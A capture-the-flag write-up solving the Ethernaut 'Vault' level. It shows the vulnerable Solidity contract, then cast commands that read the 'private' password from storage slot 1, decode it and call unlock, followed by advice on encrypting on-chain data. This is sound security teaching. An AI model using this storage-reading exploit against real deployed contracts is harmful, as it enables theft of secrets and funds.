# Vault Level Outline

**Difficulty : 3/10**

Unlock the vault to pass the level!

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188)

## Solution

Nothing on the blockchain is private, not even private variables. We can probe the memory slot from the smart contract to find the value of password.

- Storage slot 0 = locked

- Storage slot 1 = password

So to find the value of password we inspect storage slot 1.

### Walkthrough
##### 1. Inspect the first storage slot of the vault 
```console
cast storage $LEVEL_ADDRESS 1
```
output 
```console
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

##### 2. For fun lets see the hex data in utf8 format
```console
cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```
output 
```console
A very strong secret password :)
```

##### 3. Call the "unlock(bytes32)" function with the extracted password
```console
cast send $LEVEL_ADDRESS "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --private-key $PRIVATE_KEY 
```
## Further Reading
To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.



---

##### [:arrow_left: Back To Main Menu](../README.md)
